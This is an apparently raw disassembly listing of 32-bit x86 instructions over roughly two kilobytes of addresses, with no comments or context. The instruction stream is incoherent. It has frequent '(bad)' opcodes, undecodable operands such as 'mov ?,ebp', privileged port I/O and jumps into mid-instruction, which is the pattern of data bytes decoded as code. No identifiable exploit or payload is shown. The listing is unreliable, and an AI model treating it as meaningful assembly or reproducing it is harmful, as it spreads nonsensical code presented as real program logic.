  41b28b:	inc    ebx
  41b28c:	mov    ebx,0x80d672d5
  41b291:	jl     0x41b293
  41b293:	in     eax,0x61
  41b295:	test   DWORD PTR [ecx+0x53373b60],eax
  41b29b:	mov    ebx,0xeb217eff
  41b2a0:	shl    BYTE PTR [edx+0x37],cl
  41b2a3:	addr16 nop
  41b2a5:	xor    esp,edi
  41b2a7:	cld    
  41b2a8:	(bad)  
  41b2a9:	fild   WORD PTR [edi-0x63f534e6]
  41b2af:	cmp    dl,al
  41b2b1:	mov    cl,0xf3
  41b2b3:	sbb    eax,0x1cc0f8b9
  41b2b8:	sub    eax,0x505662e3
  41b2bd:	stos   DWORD PTR es:[edi],eax
  41b2be:	push   edi
  41b2bf:	repnz lds esi,FWORD PTR [edi-0x435c71c4]
  41b2c6:	jge    0x41b289
  41b2c8:	nop    esp
  41b2cb:	dec    esi
  41b2cc:	push   0x0
  41b2ce:	inc    edi
  41b2cf:	rcr    DWORD PTR [eax+0x1],1
  41b2d2:	repnz inc edi
  41b2d4:	dec    esp
  41b2d5:	adc    BYTE PTR [ebp-0xa],ah
  41b2d8:	pushf  
  41b2d9:	int3   
  41b2da:	int3   
  41b2db:	or     eax,0xad006abb
  41b2e0:	sub    ebx,ebp
  41b2e2:	inc    edi
  41b2e3:	pop    ds
  41b2e4:	jp     0x41b362
  41b2e6:	inc    ebp
  41b2e7:	inc    eax
  41b2e8:	das    
  41b2e9:	repz test eax,0xa61a5cce
  41b2ef:	fisttp WORD PTR [edi]
  41b2f1:	mov    bl,0x11
  41b2f3:	icebp  
  41b2f4:	loope  0x41b27d
  41b2f6:	popf   
  41b2f7:	fisub  DWORD PTR [ecx-0x31428d49]
  41b2fd:	pop    edx
  41b2fe:	adc    BYTE PTR [ecx+0x22eff9de],ch
  41b304:	or     BYTE PTR [ecx+ebp*2-0x923dcef],dl
  41b30b:	in     eax,dx
  41b30c:	leave  
  41b30d:	and    eax,0x98640052
  41b312:	pop    edx
  41b313:	jo     0x41b2cb
  41b315:	sbb    al,0x52
  41b317:	stc    
  41b318:	dec    ecx
  41b319:	fdivr  DWORD PTR [ebp+0x36]
  41b31c:	loope  0x41b348
  41b31e:	inc    ebx
  41b31f:	pop    edi
  41b320:	mov    dh,0x41
  41b322:	dec    edi
  41b323:	push   ebp
  41b324:	lea    esi,[ecx-0x745605c9]
  41b32a:	xchg   ebp,eax
  41b32b:	int3   
  41b32c:	sbb    DWORD PTR [edi+ebp*2],ebp
  41b32f:	pop    eax
  41b330:	and    al,0x78
  41b332:	ficomp DWORD PTR [ecx+0x4ea39954]
  41b338:	mov    bh,0x36
  41b33a:	cmp    al,0x72
  41b33c:	dec    eax
  41b33d:	div    bl
  41b33f:	add    al,0x12
  41b341:	pusha  
  41b342:	out    dx,al
  41b343:	pop    edi
  41b344:	push   esi
  41b345:	jg     0x41b366
  41b347:	xchg   DWORD PTR [edi-0x1541fecc],edx
  41b34d:	inc    ebx
  41b34e:	jno    0x41b333
  41b350:	or     ebp,DWORD PTR ss:[ecx-0x7ce95a0]
  41b357:	jb     0x41b36f
  41b359:	sbb    dh,al
  41b35b:	and    al,0xb5
  41b35d:	push   esi
  41b35e:	jmp    0x41b2e5
  41b360:	cmp    eax,0xf85787eb
  41b365:	dec    edx
  41b366:	push   ds
  41b367:	pop    esi
  41b368:	or     DWORD PTR [ebp-0x70],0x506be6f5
  41b36f:	add    DWORD PTR [esi],esi
  41b371:	mov    ds:0x3f2463dc,eax
  41b376:	pop    es
  41b377:	xor    al,0x1a
  41b379:	ret    
  41b37a:	inc    ebp
  41b37b:	and    BYTE PTR [edx+eax*1+0x5364228a],bl
  41b382:	cs cdq 
  41b384:	jb     0x41b3a5
  41b386:	pop    ecx
  41b387:	xchg   ecx,eax
  41b388:	push   edx
  41b389:	sbb    DWORD PTR [ebp-0x24],ecx
  41b38c:	popa   
  41b38d:	sbb    ecx,DWORD PTR [edi+0x2a]
  41b390:	bound  eax,QWORD PTR [edi-0x3a1232f1]
  41b396:	add    DWORD PTR [ebx+0x5cef7608],ebp
  41b39c:	add    al,0xc8
  41b39e:	les    ebx,FWORD PTR [ecx]
  41b3a0:	fnstenv [edi+0x71b6396c]
  41b3a6:	push   ebx
  41b3a7:	test   DWORD PTR [ebx+0x18],0xbe7e728d
  41b3ae:	inc    edi
  41b3af:	je     0x41b336
  41b3b1:	sar    eax,0xd4
  41b3b4:	fadd   QWORD PTR [esi+edi*1+0x7e]
  41b3b8:	or     DWORD PTR [edi-0x77],esi
  41b3bb:	int    0x25
  41b3bd:	cwde   
  41b3be:	ss or  al,0x72
  41b3c1:	mov    ch,0xe2
  41b3c3:	mov    al,ds:0xd0a386a
  41b3c8:	retf   0x6d12
  41b3cb:	push   ebx
  41b3cc:	test   al,0xff
  41b3ce:	idiv   ch
  41b3d0:	push   ecx
  41b3d1:	jl     0x41b3fd
  41b3d3:	fmul   st(3),st
  41b3d5:	sub    ch,ch
  41b3d7:	ja     0x41b44d
  41b3d9:	pop    ebp
  41b3da:	xor    DWORD PTR [ecx],0x754892a2
  41b3e0:	test   al,0x3f
  41b3e2:	lock mov dl,0x24
  41b3e5:	cdq    
  41b3e6:	mov    eax,ds:0x1998cca2
  41b3eb:	loopne 0x41b390
  41b3ed:	test   edx,edi
  41b3ef:	mov    eax,ds:0xe78d2ad7
  41b3f4:	out    dx,al
  41b3f5:	inc    eax
  41b3f6:	out    0x37,eax
  41b3f8:	neg    DWORD PTR [ebp-0x79]
  41b3fb:	xor    eax,0xc122973d
  41b400:	jno    0x41b45e
  41b402:	int    0xe6
  41b404:	push   cs
  41b405:	cmp    eax,0x27ae3e38
  41b40a:	xchg   ch,ch
  41b40c:	jb     0x41b397
  41b40e:	adc    BYTE PTR [ebp+edx*2+0x2cd26f7],ch
  41b415:	cmp    al,0x51
  41b417:	fs ins BYTE PTR es:[edi],dx
  41b419:	pop    ecx
  41b41a:	and    esp,0xffffff91
  41b41d:	mov    ch,0xac
  41b41f:	out    0xd2,al
  41b421:	in     al,dx
  41b422:	inc    esp
  41b423:	les    edx,FWORD PTR [ebp+0x4d]
  41b426:	sar    BYTE PTR [ebp+0x6a],0x7d
  41b42a:	and    eax,0x75576604
  41b42f:	rcl    dl,0xd5
  41b432:	xor    bl,BYTE PTR [ebx]
  41b434:	pop    ecx
  41b435:	push   ds
  41b436:	pop    ebx
  41b437:	stos   BYTE PTR es:[edi],al
  41b438:	leave  
  41b439:	adc    ebx,DWORD PTR [edx+0x5e]
  41b43c:	ret    
  41b43d:	neg    BYTE PTR [edx+0x5a17b217]
  41b443:	jb     0x41b43f
  41b445:	or     edx,esp
  41b447:	inc    edi
  41b448:	repnz mov ebp,0x5f884ea6
  41b44e:	pop    ss
  41b44f:	cmp    eax,0x26e45b90
  41b454:	push   es
  41b455:	mov    eax,ds:0x84237ae8
  41b45a:	lock xor ecx,0xffffff80
  41b45e:	outs   dx,BYTE PTR ds:[esi]
  41b45f:	in     al,0x22
  41b461:	aad    0x31
  41b463:	ins    BYTE PTR es:[edi],dx
  41b464:	sbb    BYTE PTR [esp+ebp*1],cl
  41b467:	bound  ecx,QWORD PTR [ecx]
  41b469:	push   cs
  41b46a:	mov    ebp,DWORD PTR [ebx]
  41b46c:	pop    di
  41b46e:	inc    ebx
  41b46f:	adc    BYTE PTR [ecx-0xd],al
  41b472:	push   ss
  41b473:	movlps QWORD PTR [ebp+0x2d],xmm1
  41b477:	xlat   BYTE PTR ds:[ebx]
  41b478:	cmp    al,0xe0
  41b47a:	and    esi,edx
  41b47c:	xor    al,0x4f
  41b47e:	aas    
  41b47f:	das    
  41b480:	iret   
  41b481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b482:	jno    0x41b4e0
  41b484:	push   0x7ca5380c
  41b489:	mov    ecx,DWORD PTR [edi-0x74]
  41b48c:	ret    
  41b48d:	mov    ecx,0xb03fbb3
  41b492:	pusha  
  41b493:	sbb    cl,BYTE PTR [eax+0x19]
  41b496:	inc    esi
  41b497:	xchg   BYTE PTR [esi-0xb4b7fdd],al
  41b49d:	adc    BYTE PTR [edx-0xc647df4],0x9e
  41b4a4:	xor    DWORD PTR [ecx+eax*1],edx
  41b4a7:	inc    ebp
  41b4a8:	or     BYTE PTR [edx-0x7a390ad2],0x4b
  41b4af:	mov    ss,eax
  41b4b1:	mov    DWORD PTR [ebp+0x2e47860a],esi
  41b4b7:	push   0x76
  41b4b9:	xchg   cl,ah
  41b4bb:	mov    cl,0x69
  41b4bd:	mov    es:0xa134129e,eax
  41b4c3:	inc    eax
  41b4c4:	es jmp 0x570b97be
  41b4ca:	cwde   
  41b4cb:	dec    esi
  41b4cc:	sbb    al,0xed
  41b4ce:	out    dx,eax
  41b4cf:	jmp    0x41b4ce
  41b4d1:	(bad)
  41b4d5:	outs   dx,BYTE PTR ds:[esi]
  41b4d6:	adc    BYTE PTR [ecx],dh
  41b4d8:	aaa    
  41b4d9:	cli    
  41b4da:	icebp  
  41b4db:	retf   
  41b4dc:	mov    BYTE PTR [ebp-0x2f],cl
  41b4df:	data16 (bad) 
  41b4e1:	test   BYTE PTR [edi],bl
  41b4e3:	out    dx,al
  41b4e4:	repnz in al,dx
  41b4e6:	mov    al,0x75
  41b4e9:	pop    ecx
  41b4ea:	add    BYTE PTR [ebp+0x73794276],bl
  41b4f0:	pop    ds
  41b4f1:	sbb    eax,0xb6b4921d
  41b4f6:	outs   dx,DWORD PTR ds:[esi]
  41b4f7:	in     al,0x79
  41b4f9:	pop    ss
  41b4fa:	cld    
  41b4fb:	outs   dx,DWORD PTR ds:[esi]
  41b4fc:	mov    dl,0x99
  41b4fe:	mov    esi,0xb0d41ee1
  41b503:	cmp    DWORD PTR [edx-0x4de424d8],0x13d14fe3
  41b50d:	xchg   edx,eax
  41b50e:	adc    bl,ch
  41b510:	cmp    bl,BYTE PTR [eax]
  41b512:	push   0xffffff93
  41b514:	sbb    ah,ch
  41b516:	sbb    BYTE PTR [ebx],dh
  41b518:	fwait
  41b519:	push   cs
  41b51a:	fsub   QWORD PTR [ecx]
  41b51c:	xor    ah,bh
  41b51e:	pop    esp
  41b51f:	jp     0x41b51c
  41b521:	repnz mov bl,0xf5
  41b524:	clc    
  41b525:	std    
  41b526:	das    
  41b527:	aas    
  41b528:	or     bh,BYTE PTR [eax+0x79c3b0e]
  41b52e:	inc    edi
  41b52f:	xchg   edx,eax
  41b530:	in     al,dx
  41b531:	fstp   QWORD PTR [esi+edx*2-0x7ba0c7a5]
  41b538:	fdiv   QWORD PTR [ecx-0x78a95d70]
  41b53e:	bound  edx,QWORD PTR [edx+ebx*4]
  41b541:	ror    BYTE PTR [ebp+0x695a447b],1
  41b547:	jecxz  0x41b4cb
  41b549:	lahf   
  41b54a:	stos   BYTE PTR es:[edi],al
  41b54b:	test   DWORD PTR [ebx-0x67],edx
  41b54e:	shl    bl,1
  41b550:	fstp   DWORD PTR [edi]
  41b552:	push   cs
  41b553:	add    ah,BYTE PTR [esi+0x2829a9eb]
  41b559:	cmc    
  41b55a:	adc    al,0x8e
  41b55c:	fadd   DWORD PTR [edx-0x68]
  41b55f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b560:	aaa    
  41b561:	(bad)  
  41b562:	icebp  
  41b563:	cmp    DWORD PTR [eax-0x26],edi
  41b566:	aam    0x11
  41b568:	sub    DWORD PTR ds:0x4fa32381,edx
  41b56e:	and    al,0x9a
  41b570:	pusha  
  41b571:	add    ebp,eax
  41b573:	loop   0x41b54f
  41b575:	xchg   edx,eax
  41b576:	into   
  41b577:	aam    0x27
  41b579:	mov    eax,0x43e15c60
  41b57e:	cmp    al,0x61
  41b580:	adc    BYTE PTR [ecx],al
  41b582:	ins    BYTE PTR es:[edi],dx
  41b583:	or     BYTE PTR [ebp+0x2a],al
  41b586:	adc    ch,ah
  41b588:	add    BYTE PTR [esp+eax*2],al
  41b58b:	mov    dl,0x1f
  41b58d:	std    
  41b58e:	and    eax,0x5d35075b
  41b593:	fisub  WORD PTR [ebx-0x7fcea1d3]
  41b599:	inc    esp
  41b59a:	mov    bl,0x46
  41b59c:	xchg   edi,eax
  41b59d:	mov    bh,0xe7
  41b59f:	das    
  41b5a0:	jg     0x41b593
  41b5a2:	pop    eax
  41b5a3:	mov    bh,0x5a
  41b5a5:	adc    al,0x91
  41b5a7:	mov    dl,0xab
  41b5a9:	sbb    BYTE PTR [ecx+0xc],bl
  41b5ac:	mov    eax,ds:0x495b6337
  41b5b1:	pusha  
  41b5b2:	arpl   WORD PTR [ebx+ebp*1],bp
  41b5b5:	lock repz (bad) 
  41b5b8:	call   0xff65:0x4b25f2d
  41b5bf:	loope  0x41b62e
  41b5c1:	cs xor dl,BYTE PTR es:[eax]
  41b5c5:	and    eax,0x4449380e
  41b5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5cb:	pop    ebx
  41b5cc:	neg    DWORD PTR [ecx*8-0x1c8d0cba]
  41b5d3:	mov    ah,0xea
  41b5d5:	sub    BYTE PTR [ecx],cl
  41b5d7:	mov    edx,0x66bace73
  41b5dc:	nop
  41b5dd:	fild   WORD PTR [edi+0xc]
  41b5e0:	pop    DWORD PTR [eax]
  41b5e2:	or     DWORD PTR ds:0xa76ec0cf,esp
  41b5e8:	stos   DWORD PTR es:[edi],eax
  41b5e9:	xchg   edx,eax
  41b5ea:	shl    DWORD PTR [eax+0x69ad83f6],cl
  41b5f0:	sbb    eax,0x9f80b3ff
  41b5f5:	and    BYTE PTR [eax-0x4a],dh
  41b5f8:	cdq    
  41b5f9:	adc    DWORD PTR [ebx*4-0x2621cb0f],edi
  41b600:	leave  
  41b601:	ficomp DWORD PTR [ebx-0x10]
  41b604:	jb     0x41b657
  41b606:	leave  
  41b607:	stos   BYTE PTR es:[edi],al
  41b608:	shr    ch,1
  41b60a:	sub    esi,ebp
  41b60c:	fdiv   QWORD PTR [edx*2+0x16ffd047]
  41b613:	fldenv [ebp-0x63]
  41b616:	adc    DWORD PTR [ebp+0x6f],esi
  41b619:	bound  esp,QWORD PTR [ebp-0x23]
  41b61c:	call   FWORD PTR cs:[ebp+0x4f]
  41b620:	fisttp QWORD PTR ds:[eax+eax*8-0x76]
  41b625:	xchg   edi,eax
  41b626:	mov    al,BYTE PTR [ebx+edx*8+0x483007f5]
  41b62d:	cmp    BYTE PTR [ecx+eiz*8-0x7a],dl
  41b631:	jne    0x41b5fd
  41b633:	inc    edx
  41b634:	imul   ebx,DWORD PTR [ebx],0xffffff9b
  41b637:	mov    al,ds:0x8009bd69
  41b63c:	lock sar BYTE PTR [ecx+0x1e],cl
  41b640:	mov    eax,0x8ca26e2f
  41b645:	xor    ecx,DWORD PTR ds:0x88d556da
  41b64b:	adc    bh,BYTE PTR [ebp-0x2e]
  41b64e:	test   BYTE PTR [edx+0x60],dl
  41b651:	mov    ebx,0xe5474b9e
  41b656:	mov    gs,edi
  41b658:	jns    0x41b654
  41b65a:	sbb    bh,dh
  41b65c:	(bad)  
  41b65e:	sub    esi,DWORD PTR [ebx+ecx*4-0x60896d9c]
  41b665:	inc    ebx
  41b666:	mov    bl,0xae
  41b668:	(bad)  
  41b66a:	icebp  
  41b66b:	dec    esp
  41b66c:	sbb    BYTE PTR [edx],bl
  41b66e:	adc    ah,ch
  41b670:	into   
  41b671:	push   ebx
  41b672:	jmp    0x41b6e0
  41b674:	inc    esp
  41b675:	out    0x22,eax
  41b677:	(bad)  
  41b678:	sbb    ebx,ecx
  41b67a:	cmp    al,0x18
  41b67c:	or     BYTE PTR [edx-0x6a],cl
  41b67f:	shl    BYTE PTR [esi+0x2c],cl
  41b682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b683:	test   ebp,ecx
  41b685:	cmc    
  41b686:	xor    eax,0xde2072c9
  41b68b:	leave  
  41b68c:	mov    al,0x6
  41b68e:	shl    edx,cl
  41b690:	test   eax,0x3bb2e75f
  41b695:	not    BYTE PTR [esi-0x65]
  41b698:	loope  0x41b697
  41b69a:	test   dl,ah
  41b69c:	inc    ebx
  41b69d:	ror    DWORD PTR [eax+0x2f48fdad],0xb7
  41b6a4:	jo     0x41b707
  41b6a6:	sbb    eax,0xda2f1317
  41b6ab:	cmp    BYTE PTR ds:0xf775efe9,dl
  41b6b1:	div    DWORD PTR [edi-0x13e3800b]
  41b6b7:	loopne 0x41b6de
  41b6b9:	aaa    
  41b6ba:	arpl   sp,dx
  41b6bc:	rol    BYTE PTR [edx],1
  41b6be:	int    0xb1
  41b6c0:	jns    0x41b707
  41b6c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6c3:	jle    0x41b691
  41b6c5:	jl     0x41b6fd
  41b6c7:	daa    
  41b6c8:	stos   BYTE PTR es:[edi],al
  41b6c9:	mov    ecx,0x36a7508
  41b6ce:	gs sub al,0xa0
  41b6d1:	repnz inc ecx
  41b6d3:	inc    edi
  41b6d4:	mov    ?,ebp
  41b6d6:	mov    al,ds:0x7b95f92f
  41b6db:	mov    eax,0x2955e0d2
  41b6e0:	jmp    0xf32acb62
  41b6e5:	ror    DWORD PTR [ebp-0x7f],1
  41b6e8:	(bad)  
  41b6e9:	lahf   
  41b6ea:	dec    ebp
  41b6eb:	test   DWORD PTR [edx+0x34a06740],ecx
  41b6f1:	adc    eax,0xef1f2c36
  41b6f6:	adc    BYTE PTR [ecx+eax*1],dl
  41b6f9:	ret    0xc23b
  41b6fc:	jg     0x41b756
  41b6fe:	repz cld 
  41b700:	mov    BYTE PTR [ebx+0xe],bl
  41b703:	or     dl,BYTE PTR [edx-0x744eaaf2]
  41b709:	xchg   DWORD PTR [edx-0x55],esi
  41b70c:	xchg   ecx,eax
  41b70d:	int3   
  41b70e:	sbb    eax,0xf1aac5e0
  41b713:	ja     0x41b77d
  41b715:	shl    BYTE PTR [edi+0x4f],0x9e
  41b719:	and    bl,0x51
  41b71c:	sbb    ch,bh
  41b71e:	fistp  DWORD PTR [edi-0x2c]
  41b721:	sbb    eax,0x3b6d7357
  41b726:	and    DWORD PTR [eax+0xf66d096],esp
  41b72c:	cmp    bl,bl
  41b72e:	add    DWORD PTR [eax+eax*4-0x46],ebp
  41b732:	jno    0x41b748
  41b734:	stos   BYTE PTR es:[edi],al
  41b735:	pusha  
  41b736:	jo     0x41b724
  41b738:	cmp    al,0x5b
  41b73a:	nop
  41b73b:	test   BYTE PTR ds:0x5e48412d,cl
  41b741:	out    0x1c,al
  41b743:	fnstcw WORD PTR [eax]
  41b745:	cmp    ecx,DWORD PTR [ebx+0x53440501]
  41b74b:	lock push esi
  41b74d:	and    bh,BYTE PTR [esi-0x65]
  41b750:	cs ins BYTE PTR es:[edi],dx
  41b752:	ret    
  41b753:	xchg   DWORD PTR [edi-0x711917fd],ebp
  41b759:	cld    
  41b75a:	inc    esp
  41b75b:	or     al,0x3f
  41b75d:	loop   0x41b730
  41b75f:	mov    BYTE PTR [esi+0x5a2578dc],ch
  41b765:	mov    dh,0x7d
  41b767:	aad    0x1d
  41b769:	loop   0x41b7c8
  41b76b:	stc    
  41b76c:	jae    0x41b72f
  41b76e:	loope  0x41b743
  41b770:	shl    BYTE PTR [esi-0x53f45f8c],cl
  41b776:	cmc    
  41b777:	das    
  41b778:	stos   BYTE PTR es:[edi],al
  41b779:	ja     0x41b783
  41b77b:	push   ebx
  41b77c:	in     eax,dx
  41b77d:	jle    0x41b7f5
  41b77f:	(bad)  
  41b781:	or     al,0x4b
  41b783:	fisubr DWORD PTR [ebp+0xa6eee7]
  41b789:	loope  0x41b729
  41b78b:	call   0xe715a87d
  41b790:	jecxz  0x41b715
  41b792:	je     0x41b761
  41b794:	pop    esp
  41b795:	inc    esi
  41b796:	iret   
  41b797:	mov    dh,0x6
  41b799:	pop    edx
  41b79a:	xor    edi,edi
  41b79c:	inc    edi
  41b79d:	sub    BYTE PTR [esp+eiz*8-0x4e9b6764],0x65
  41b7a5:	or     ebx,DWORD PTR [ebp+edi*2+0x6c]
  41b7a9:	test   BYTE PTR [esi],ah
  41b7ab:	inc    esi
  41b7ac:	stos   BYTE PTR es:[edi],al
  41b7ad:	nop
  41b7ae:	xchg   ebx,eax
  41b7af:	and    dh,ah
  41b7b1:	mov    edx,0x34f8b104
  41b7b6:	addr16 pop eax
  41b7b8:	sbb    eax,0xf22dacec
  41b7bd:	nop
  41b7be:	jecxz  0x41b771
  41b7c0:	out    dx,eax
  41b7c1:	xchg   esp,eax
  41b7c2:	gs lahf 
  41b7c4:	sbb    cl,BYTE PTR [esi-0x36cb095f]
  41b7ca:	push   esi
  41b7cb:	cs in  eax,dx
  41b7cd:	lea    ebp,[ecx-0x47]
  41b7d0:	(bad)  [edi-0x1f]
  41b7d3:	jle    0x41b7c1
  41b7d5:	sahf   
  41b7d6:	xchg   ebx,eax
  41b7d7:	mov    al,ds:0x1280b474
  41b7dc:	jmp    0x41b7ae
  41b7de:	add    dl,BYTE PTR [ecx+ebx*2+0x4fabd428]
  41b7e5:	mov    al,0x3e
  41b7e7:	in     eax,dx
  41b7e8:	retf   
  41b7e9:	fidiv  DWORD PTR [eax-0x1e]
  41b7ec:	xor    BYTE PTR [edi-0x63],0x81
  41b7f0:	fistp  WORD PTR [ebp+0x6f]
  41b7f3:	cdq    
  41b7f4:	int    0x60
  41b7f6:	xchg   edx,eax
  41b7f7:	dec    ebx
  41b7f8:	call   0xa6ece1ce
  41b7fd:	jmp    0x2b96:0x951ad5fc
  41b804:	clc    
  41b805:	(bad)  [ebx-0x3d]
  41b808:	add    BYTE PTR [esi+ebx*1-0x70],ah
  41b80c:	xchg   edx,eax
  41b80d:	fucom  st(1)
  41b80f:	pop    ds
  41b810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b811:	jmp    FWORD PTR [esi+0x2c]
  41b814:	mov    ecx,0x4ebf2b27
  41b819:	ret    0x7021
  41b81c:	cmp    BYTE PTR [eax+0x4a180029],bl
  41b822:	ss jb  0x41b824
  41b825:	xor    BYTE PTR [esp+edx*2-0x9d4cd90],bl
  41b82c:	push   esp
  41b82d:	push   ss
  41b82e:	jge    0x41b89a
  41b830:	push   edx
  41b831:	pusha  
  41b832:	xchg   DWORD PTR [eax-0x1a],ecx
  41b835:	lock call 0x21480fcd
  41b83b:	scas   eax,DWORD PTR es:[edi]
  41b83c:	jnp    0x41b8af
  41b83e:	sbb    eax,0x23f946ec
  41b843:	add    DWORD PTR [ebp+0x7f],0xffffff8e
  41b847:	es pop ss
  41b849:	inc    edi
  41b84a:	stc    
  41b84b:	sub    ch,BYTE PTR [ecx-0x3e4e2726]
  41b851:	cwde   
  41b852:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41b854:	mov    ah,0x65
  41b856:	cmp    DWORD PTR [ecx+ecx*1+0x5f],ebp
  41b85a:	shl    DWORD PTR [esi],cl
  41b85c:	mov    al,ds:0xf359d483
  41b861:	mov    al,0x63
  41b863:	imul   esi,DWORD PTR [ebx+ebp*2+0x5ba1b689],0x1a
  41b86b:	dec    edi
  41b86c:	inc    ecx
  41b86d:	mov    ds:0x4837fca8,al
  41b872:	ds xchg esi,eax
  41b874:	sbb    DWORD PTR [ebx],ebx
  41b876:	test   BYTE PTR [ebx-0x2a2e8a96],0xd7
  41b87d:	lahf   
  41b87e:	lgs    edi,FWORD PTR [ecx+esi*4]
  41b882:	pop    esi
  41b883:	push   eax
  41b884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b885:	jo     0x41b8d9
  41b887:	sub    esp,DWORD PTR [eax]
  41b889:	std    
  41b88a:	imul   esi,DWORD PTR [esi],0xffffff9b
  41b88d:	sbb    DWORD PTR [eax],ebp
  41b88f:	or     ecx,edx
  41b891:	and    al,BYTE PTR [ecx-0x41]
  41b894:	jnp    0x41b8f5
  41b896:	jl     0x41b8bd
  41b898:	(bad)  
  41b899:	dec    esp
  41b89a:	xchg   esi,eax
  41b89b:	fist   WORD PTR [ebx-0x72]
  41b89e:	ja     0x41b8a8
  41b8a0:	mov    bh,0xde
  41b8a2:	mov    ch,0x8f
  41b8a4:	fnstcw WORD PTR ds:0x1a439bf8
  41b8aa:	push   0x45
  41b8ac:	hlt    
  41b8ad:	cmp    eax,0x87cad60e
  41b8b2:	rcr    BYTE PTR [edx*2-0x500e8917],0xc9
  41b8ba:	and    al,0xe4
  41b8bc:	sub    dl,BYTE PTR [eax-0x7e0aaac3]
  41b8c2:	xchg   edx,eax
  41b8c3:	mov    dh,0x28
  41b8c5:	mov    eax,ds:0xf6280ba9
  41b8ca:	fist   DWORD PTR [edi+0x5e55b5bc]
  41b8d0:	inc    ebp
  41b8d1:	loop   0x41b8eb
  41b8d3:	ficomp DWORD PTR [ebx+0x75]
  41b8d6:	cli    
  41b8d7:	test   DWORD PTR [eax+0x7905fb08],edx
  41b8dd:	adc    DWORD PTR [esi+0x7c],0xdbeab476
  41b8e4:	imul   esp,DWORD PTR [ebx-0xf3c5ee3],0xffffffb7
  41b8eb:	dec    esi
  41b8ec:	cs mov dl,0x15
  41b8ef:	mov    dl,0xb7
  41b8f1:	mov    edx,0xd5cc1cc9
  41b8f6:	push   ds
  41b8f7:	xor    al,0x15
  41b8f9:	rcr    eax,0xcd
  41b8fc:	arpl   WORD PTR [eax],bx
  41b8fe:	test   al,0x7
  41b900:	lds    ecx,FWORD PTR [ebp+0x3eeabc69]
  41b906:	(bad)  
  41b907:	or     esp,eax
  41b909:	cmp    BYTE PTR [ebx+0x5e9bfb32],dh
  41b90f:	mov    edi,0x83da96dc
  41b914:	and    edx,DWORD PTR [ebx-0x2f]
  41b917:	cmp    edi,esp
  41b919:	sub    edi,ebx
  41b91b:	mov    ebx,0xcfec561e
  41b920:	and    al,0xcc
  41b922:	es push esi
  41b924:	inc    esp
  41b925:	dec    esi
  41b926:	pop    DWORD PTR [edi+0x6e8d5774]
  41b92c:	jge    0x41b8d3
  41b92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b92f:	repnz pushf 
  41b931:	xchg   DWORD PTR ds:0x5c739970,ebx
  41b937:	push   ebx
  41b938:	jg     0x41b90a
  41b93a:	lods   eax,DWORD PTR ds:[esi]
  41b93b:	jl     0x41b998
  41b93d:	push   cs
  41b93e:	in     al,dx
  41b93f:	ficomp DWORD PTR [ebx]
  41b941:	or     esp,DWORD PTR [esp+eax*2]
  41b944:	nop
  41b945:	repz addr16 cmc 
  41b948:	cmp    DWORD PTR [ecx],ecx
  41b94a:	mov    cl,0xaa
  41b94c:	pop    ebx
  41b94d:	adc    eax,0xc29e35c6
  41b952:	clc    
  41b953:	mov    al,ds:0x22460377
  41b958:	retf   
  41b959:	and    al,0xde
  41b95b:	out    0x69,al
  41b95d:	cli    
  41b95e:	push   ecx
  41b95f:	in     eax,dx
  41b960:	cmp    DWORD PTR [ecx],ebx
  41b962:	std    
  41b963:	push   ecx
  41b964:	shr    BYTE PTR [ecx],cl
  41b966:	jnp    0x41b911
  41b968:	repz or BYTE PTR [esi-0x5c],0x2f
  41b96d:	(bad)  
  41b96e:	(bad)  
  41b96f:	sbb    al,0xd6
  41b971:	movntq QWORD PTR [esi],mm6
  41b974:	adc    BYTE PTR [eax+0x42],bh
  41b977:	fidiv  DWORD PTR [edi+ebp*8-0x4]
  41b97b:	int    0x5b
  41b97d:	mov    ds:0x3c36b0dc,eax
  41b982:	sbb    BYTE PTR ds:0xcc992101,bh
  41b988:	mov    ecx,0xf4e8d7df
  41b98d:	test   DWORD PTR [ebx+0x15],esp
  41b990:	jge    0x41b94c
  41b992:	aam    0x79
  41b994:	cmp    edx,DWORD PTR [esi+0x6e08225c]
  41b99a:	pop    ebp
  41b99b:	push   edx
  41b99c:	(bad)  
  41b99d:	jmp    0x12a3be05
  41b9a2:	jg     0x41b946
  41b9a4:	mov    ecx,edx
  41b9a6:	xchg   ebx,eax
  41b9a7:	push   0x7e
  41b9a9:	(bad)  
  41b9aa:	je     0x41ba1c
  41b9ac:	(bad)  {k4}
  41b9b1:	into   
  41b9b2:	xor    DWORD PTR [ecx-0x50],ebp
  41b9b5:	idiv   bh
  41b9b7:	push   eax
  41b9b8:	adc    DWORD PTR [ecx],edi
  41b9ba:	das    
  41b9bb:	mov    ch,0x1b
  41b9bd:	xor    DWORD PTR [esi],0x24
  41b9c0:	inc    ebp
  41b9c1:	add    DWORD PTR [ecx+0x7c],0x47eabafd
  41b9c8:	aas    
  41b9c9:	je     0x41b9b4
  41b9cb:	sub    eax,0x56d96dca
  41b9d0:	sub    esp,DWORD PTR [ebp+edi*1+0x11]
  41b9d4:	mov    BYTE PTR [edi],ah
  41b9d6:	in     eax,0x3f
  41b9d8:	mov    cl,0x70
  41b9da:	outs   dx,BYTE PTR ds:[esi]
  41b9db:	cmc    
  41b9dc:	retf   0x8054
  41b9df:	je     0x41ba2b
  41b9e1:	jmp    0x7fd:0x2e20fb0e
  41b9e8:	or     al,BYTE PTR gs:[eax]
  41b9eb:	ret    0x3cd8
  41b9ee:	mov    ?,WORD PTR [ebx+0x9]
  41b9f1:	addr16 nop
  41b9f3:	rol    DWORD PTR [edx+0x48],cl
  41b9f6:	dec    ebp
  41b9f7:	int    0x79
  41b9f9:	push   0xec4281f
  41b9fe:	jp     0x41ba54
  41ba00:	lds    eax,FWORD PTR gs:[ebp+0x3132db48]
  41ba07:	enter  0x7510,0x86
  41ba0b:	inc    ecx
  41ba0c:	cmc    
  41ba0d:	fisub  DWORD PTR [eax-0x22]
  41ba10:	pop    ss
  41ba11:	pusha  
  41ba12:	fimul  WORD PTR [esi]
  41ba14:	ja     0x41ba0b
  41ba16:	or     al,0xd1
  41ba18:	popf   
  41ba19:	int3   
  41ba1a:	and    ch,bl
  41ba1c:	pushf  
